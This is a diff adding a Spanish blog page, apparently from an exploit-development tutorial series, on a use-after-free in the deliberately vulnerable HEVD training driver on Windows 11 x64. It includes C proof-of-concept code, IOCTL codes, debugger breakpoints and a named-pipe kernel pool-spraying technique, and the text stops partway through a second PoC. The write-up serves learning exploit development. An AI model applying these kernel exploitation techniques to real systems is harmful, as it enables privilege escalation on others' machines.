@@ -1,0 +1,756 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x03 - Acercándose al Heap Moderno del Windows Kernel // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x03 - Acercándose al Heap Moderno del Windows Kernel">
+  <meta name="twitter:description" content="Habiendo aprovechado el UaF en Windows 7 (x86), hemos obtenido una idea sólida de cómo funciona esta vulnerabilidad, es hora de intentar esto en Windows 11 (x64).
+Es importante tener en cuenta que, aunque confirmamos que Violet Phosphorus funciona contra Windows 11 24H2, durante el resto de la serie usaré Windows 11 (x64) - 10.0.22000 N/A Build 22000, simplemente porque esta es la versión con la que probé las vulnerabilidades durante el desarrollo inicial.">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x03-acerc%C3%A1ndose-al-heap-moderno-del-windows-kernel/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x03 - Acercándose al Heap Moderno del Windows Kernel">
+  <meta property="og:description" content="Habiendo aprovechado el UaF en Windows 7 (x86), hemos obtenido una idea sólida de cómo funciona esta vulnerabilidad, es hora de intentar esto en Windows 11 (x64).
+Es importante tener en cuenta que, aunque confirmamos que Violet Phosphorus funciona contra Windows 11 24H2, durante el resto de la serie usaré Windows 11 (x64) - 10.0.22000 N/A Build 22000, simplemente porque esta es la versión con la que probé las vulnerabilidades durante el desarrollo inicial.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-21T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x03 - Acercándose al Heap Moderno del Windows Kernel</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Dec 21, 2024
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          15 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Habiendo aprovechado el UaF en Windows 7 (x86), hemos obtenido una idea sólida de cómo funciona esta vulnerabilidad, es hora de intentar esto en Windows 11 (x64).</p>
+<p>Es importante tener en cuenta que, aunque confirmamos que <em>Violet Phosphorus</em> funciona contra Windows 11 24H2, durante el resto de la serie usaré <code>Windows 11 (x64) - 10.0.22000 N/A Build 22000</code>, simplemente porque esta es la versión con la que probé las vulnerabilidades durante el desarrollo inicial.</p>
+<p>Puede adaptar cualquiera de estos tutoriales a la última versión de Windows; sin embargo, como se indicó anteriormente, es probable que te encuentres con nuevos controles de seguridad introducidos en la última versión del OS.</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#ingenier%C3%ADa-inversa">Ingeniería Inversa</a>
+<ul>
+<li><a href="#dando-un-paso-atr%C3%A1s">Dando un Paso Atrás</a></li>
+<li><a href="#kernel-heap-fengshui-alex-ionescu">Kernel Heap Fengshui (Alex Ionescu)</a>
+<ul>
+<li><a href="#piscinas">Piscinas</a></li>
+<li><a href="#uso-de-cloro-para-piscinas">Uso de Cloro para Piscinas</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#regresando-a-vulndev">Regresando a VulnDev</a></li>
+<li><a href="#explotaci%C3%B3n">Explotación</a></li>
+<li><a href="#sources">Recursos</a></li>
+</ul>
+<h1 id="ingeniería-inversa">Ingeniería Inversa</h1>
+<p>Ya sabemos mucho sobre esta vulnerabilidad ya que la aprovechamos anteriormente en Windows 7 (x86), sin embargo, hay algunas cosas que debemos obtener antes de poder continuar. Como anteriormente usamos el código, ahora cambiaremos nuestro enfoque en el uso de Ghidra. Para crear nuestro exploit necesitaremos la siguiente información:</p>
+<ul>
+<li>El tamaño del objeto (para aprovechar la UaF)</li>
+<li>IOCTL códigos</li>
+</ul>
+<p>Esta información se puede obtener fácilmente ya que sabemos dónde buscar. El tamaño del objeto en x64 ha cambiado de 0x58 bytes a 0x60 bytes como se muestra aquí.</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/struct_size.png" alt="alt text"></p>
+<p>Los códigos IOCTL los podemos obtener de el <code>IrpDeviceIoCtlHandler()</code>, los que nos importan son los siguientes:</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>IOCTL Code</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AllocateUaFObjectNonPagedPoolIoctlHandler</td>
+<td>0x222013</td>
+</tr>
+<tr>
+<td>UseUaFObjectNonPagedPoolIoctlHandler</td>
+<td>0x222017</td>
+</tr>
+<tr>
+<td>FreeUaFObjectNonPagedPoolIoctlHandler</td>
+<td>0x22201b</td>
+</tr>
+<tr>
+<td>AllocateFakeObjectNonPagedPoolIoctlHandler</td>
+<td>0x22201f</td>
+</tr>
+</tbody>
+</table>
+<p>Con eso tenemos todo lo que necesitamos para crear un PoC.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// IOCTL Codes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define ALLOCATE_REAL_OBJ 0x222013
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CALL_FUNC_PTR     0x222017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE_OBJ          0x22201b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATE_FAKE_OBJ 0x22201f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocated object size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define OBJ_SIZE 0x60
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendIoctl</span>(HANDLE hHEVD, DWORD dIoctl, CHAR <span style="color:#f92672">*</span>pBuffer, DWORD dBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  dIoctl,
+</span></span><span style="display:flex;"><span>                  pBuffer,
+</span></span><span style="display:flex;"><span>                  dBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">allocate_buffer</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(OBJ_SIZE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (buffer <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buffer, <span style="color:#ae81ff">0x41</span>, OBJ_SIZE);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> buffer;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>evilBuffer <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  evilBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">allocate_buffer</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (evilBuffer <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate evil buffer for fake object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, ALLOCATE_REAL_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Freeing structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, FREE_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating new object of size 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, OBJ_SIZE);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, ALLOCATE_FAKE_OBJ, evilBuffer, OBJ_SIZE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, CALL_FUNC_PTR, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Sin embargo, una vez enviado, no tenemos control sobre el puntero de función. Qué paso?</p>
+<h2 id="dando-un-paso-atrás">Dando un Paso Atrás</h2>
+<p>Decidí establecer puntos de interrupción en las siguientes ubicaciones:</p>
+<ol>
+<li>Creación de la estructura</li>
+<li>Liberación de dicha estructura</li>
+<li>Creación del objeto falso</li>
+<li>Activando el UAF</li>
+</ol>
+<p>Los puntos de interrupción que utilicé están aquí:</p>
+<pre tabindex="0"><code>bu HEVD+0x87a8a # Instruction after calling ExAllocatePoolWithTag(global_struct)
+bu HEVD+0x87c20 # Instruction after calling ExFreePoolWithTag(global_struct)
+bu HEVD+0x87912 # Instruction after calling ExAllocatePoolWithTag(global_struct)
+bu HEVD+0x87cf2 # CALL RCX (function pointer within the global_struct)
+</code></pre><p>Mientras establecía estos puntos de interrupción, noté algo muy importante&hellip; Nuestro objeto recién asignado o más bien objeto falso NO ES <strong>0x60</strong> bytes en cambio el original 0x58 bytes.</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/five8.png" alt="alt text"></p>
+<p>Esto significa que necesitaremos encontrar una nueva forma de crear un nuevo objeto del mismo tamaño&hellip;</p>
+<h2 id="kernel-heap-fengshui-alex-ionescu">Kernel Heap Fengshui (Alex Ionescu)</h2>
+<p>En este punto no sabía que hacer&hellip;</p>
+<ul>
+<li>Qué técnicas existen para crear memoria en el NonPaged heap?</li>
+<li>Se puede hacer esto desde Userland?</li>
+</ul>
+<p>Empecé a buscar en Google si alguien más había resuelto esto y encontré artículos de <a href="https://vulndev.io/">VulnDev</a> y hicieron referencia a una publicación de <a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Alex Ionescu</a> escribiendo una técnica para hacer eso, así que decidí leer y tratar de entender el arte de Heap Fengshui.</p>
+<h3 id="piscinas">Piscinas</h3>
+<p>Cada vez que escuche la palabra &ldquo;pool&rdquo; en referencia al kernel de Windows, solo necesitas saber que son estructuras utilizadas para controlar el heap del kernel de Windows.</p>
+<p>El enfoque va ser en dos generadores de regiones de memoria: el generador normal y el grande.</p>
+<ul>
+<li><strong>Regular</strong>: Utilizadas para crear memoria que cabe dentro de una página, utilizan espacio para contener un &ldquo;pool header&rdquo; y un sección de memoria libre inicialmente</li>
+<li><strong>Big</strong>: Se utiliza para cualquier cosa más grande que una página y ocupa una o más páginas. También se utilizan cuando se utiliza el tipo <code>CacheAligned</code> de memoria de grupo, independientemente del tamaño de la memoria creada. No hay forma de garantizar fácilmente la alineación de la caché sin dedicar una página completa a una región de memoria creada.</li>
+</ul>
+<p>Dado que no hay espacio para un &ldquo;header&rdquo; en grandes regiones de memoria creadas, estas páginas se rastrean en una &ldquo;Big Pool Tracking Table&rdquo; separada (nt!PoolBigPageTable). Cada entrada en esta tabla está representada por una estructura <code>POOL_TRACKER_BIG_PAGES</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _POOL_TRACKER_BIG_PAGES
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">volatile</span> ULONGLONG Va;                                                  <span style="color:#75715e">//0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG Key;                                                              <span style="color:#75715e">//0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG Pattern:<span style="color:#ae81ff">8</span>;                                                        <span style="color:#75715e">//0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG PoolType:<span style="color:#ae81ff">12</span>;                                                      <span style="color:#75715e">//0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG SlushSize:<span style="color:#ae81ff">12</span>;                                                     <span style="color:#75715e">//0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG NumberOfBytes;                                                <span style="color:#75715e">//0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _EPROCESS<span style="color:#f92672">*</span> ProcessBilled;                                        <span style="color:#75715e">//0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>Una cosa a tener en cuenta es que la dirección virtual (VA) tiene un operador OR para indicar si está libre o en uso. Alex Ionescu nos propone un script para que WinDbg muestre todas las asignaciones de grupos grandes y algún código de controlador, pero no pude hacerlo funcionar.</p>
+<p>Por ahora, decidí seguir adelante y volver a esto más adelante, una vez que empiece a escribir mis propios controladores de kernel.</p>
+<h3 id="uso-de-cloro-para-piscinas">Uso de Cloro para Piscinas</h3>
+<p>Nuestro objetivo es encontrar una API en modo de usuario que nos dé control sobre la información en modo kernel de un objeto del kernel y crear memoria dentro del &ldquo;big pool&rdquo;.</p>
+<p>Hay dos ejemplos fáciles (según el autor xD):</p>
+<ol>
+<li>Crear un socket local, escucharlo, conectarse desde otro hilo, aceptar la conexión y luego emitir una escritura de&gt; 4 KB de datos del socket, pero no leerlo. Esto dará resultado en el &ldquo;Ancillary Function Driver (AFD.sys)&rdquo;, creando los datos del socket en la memoria en modo kernel. Como la pila de red de Windows funciona en <strong>DISPATCH_LEVEL (IRQL 2)</strong>, y la paginación no está disponible, la AFD utilizará un buffer de grupo no paginado para la asignación.</li>
+<li>Crear un &ldquo;named pipe&rdquo; y emitir una escritura de &gt;4 KB de datos, pero no leerlos. Esto dará como resultado que el sistema de archivos de &ldquo;Named Pipe File System (NPFS.SYS)&rdquo; también asigne los datos de canalización en un búfer de grupo no paginado (porque NPFS también realiza la gestión del búfer en DISPATCH_LEVEL).</li>
+</ol>
+<p>La opción 2 es la más sencilla y requiere menos líneas de código. Lo importante que debemos tener en cuenta es que NPFS antepondrá nuestro búfer con su propio &ldquo;header&rdquo; interno, que se llama <a href="https://github.com/reactos/reactos/blob/master/drivers/filesystems/npfs/npfs.h">DATA_ENTRY</a>. Cada versión de NPFS tiene un tamaño diferente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* The Entries that go into the Queue */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _NP_DATA_QUEUE_ENTRY
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    LIST_ENTRY QueueEntry;
+</span></span><span style="display:flex;"><span>    ULONG DataEntryType;
+</span></span><span style="display:flex;"><span>    PIRP Irp;
+</span></span><span style="display:flex;"><span>    ULONG QuotaInEntry;
+</span></span><span style="display:flex;"><span>    PSECURITY_CLIENT_CONTEXT ClientSecurityContext;
+</span></span><span style="display:flex;"><span>    ULONG DataSize;
+</span></span><span style="display:flex;"><span>} NP_DATA_QUEUE_ENTRY, <span style="color:#f92672">*</span>PNP_DATA_QUEUE_ENTRY;
+</span></span></code></pre></div><p>La forma de solucionar esto es crear el búfer en modo de usuario con las compensaciones correctas. Finalmente, la clave aquí es tener un búfer que sea al menos del tamaño de una página, para que podamos forzar el asignador de el &ldquo;big pool&rdquo;.</p>
+<h1 id="regresando-a-vulndev">Regresando a VulnDev</h1>
+<p>Todavía estaba confundido sobre qué hacer porque la publicación de Alex parecía usar un script de WinDbg que no funcionaba y librerías de controladores en modo Kernel (tal vez soy un n00b?). Quizás las cosas yan cambiado y ese código no funcione con nuestra versión de Windows.</p>
+<p>Lo que sigue es ver lo que hizo VulnDev e implementarlo en nuestro exploit. Parecía que VulnDev pudo lograr la asignación de un objeto (cualquier tamaño &gt;0x48) en el NonPagedPool.</p>
+<p>El PoC se puede ver aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// IOCTL Codes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define ALLOCATE_REAL_OBJ 0x222013
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CALL_FUNC_PTR     0x222017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE_OBJ          0x22201b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATE_FAKE_OBJ 0x22201f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> PipeHandles {
+</span></span><span style="display:flex;"><span>  HANDLE read;
+</span></span><span style="display:flex;"><span>  HANDLE write;
+</span></span><span style="display:flex;"><span>} PipeHandles;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> PipeHandles <span style="color:#a6e22e">CreatePipeObject</span>() {
+</span></span><span style="display:flex;"><span>  DWORD ALLOC_SIZE   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x70</span>;
+</span></span><span style="display:flex;"><span>  BYTE uBuffer[<span style="color:#ae81ff">0x28</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> }; <span style="color:#75715e">// ALLOC_SIZE - HEADER_SIZE (0x48)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  HANDLE readPipe    <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  HANDLE writePipe   <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD resultLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>(uBuffer, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x41</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>readPipe, <span style="color:#f92672">&amp;</span>writePipe, NULL, <span style="color:#66d9ef">sizeof</span>(uBuffer))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] CreatePipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(writePipe, uBuffer, <span style="color:#66d9ef">sizeof</span>(uBuffer), <span style="color:#f92672">&amp;</span>resultLength, NULL)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] WriteFile</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">struct</span> PipeHandles) {.read <span style="color:#f92672">=</span> readPipe, .write <span style="color:#f92672">=</span> writePipe};
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendIoctl</span>(HANDLE hHEVD, DWORD dIoctl, CHAR <span style="color:#f92672">*</span>pBuffer, DWORD dBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  dIoctl,
+</span></span><span style="display:flex;"><span>                  pBuffer,
+</span></span><span style="display:flex;"><span>                  dBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
